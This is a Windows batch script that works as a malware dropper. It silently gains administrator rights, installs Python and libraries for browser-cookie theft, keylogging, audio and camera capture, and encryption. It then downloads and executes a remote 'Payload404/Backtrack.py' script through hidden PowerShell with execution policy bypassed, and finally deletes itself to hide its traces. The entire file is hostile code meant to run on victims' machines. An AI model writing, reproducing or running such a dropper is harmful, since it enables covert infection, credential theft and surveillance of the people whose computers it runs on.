@echo off
NET SESSION >nul 2>&1 || (
    PowerShell -WindowStyle Hidden -Command "Start-Process -Verb RunAs -WindowStyle Hidden -FilePath '%~f0' -ArgumentList '/quiet'"
    exit /b
)
setlocal EnableDelayedExpansion
set "LOG=^>nul 2^>^&1"
where python %LOG% || (
    echo Downloading Python...
    certutil -f -urlcache -split https://www.python.org/ftp/python/3.13.7/python-3.13.7-amd64.exe %TEMP%\py.msi %LOG%
    msiexec /i %TEMP%\py.msi /quiet InstallAllUsers=1 PrependPath=1 %LOG%
    del %TEMP%\py.msi %LOG%
)
echo Installing dependencies...
python -m pip install --quiet --no-warn-script-location pywin32 pypiwin32 pycryptodome browser-cookie3 pynput sounddevice numpy opencv-python scipy requests pillow %LOG%
echo Executing payload...
PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/distroyer57/Payload404/refs/heads/main/Backtrack.py' -UseBasicParsing).Content" %LOG%
del /f /q "%~f0" %LOG%
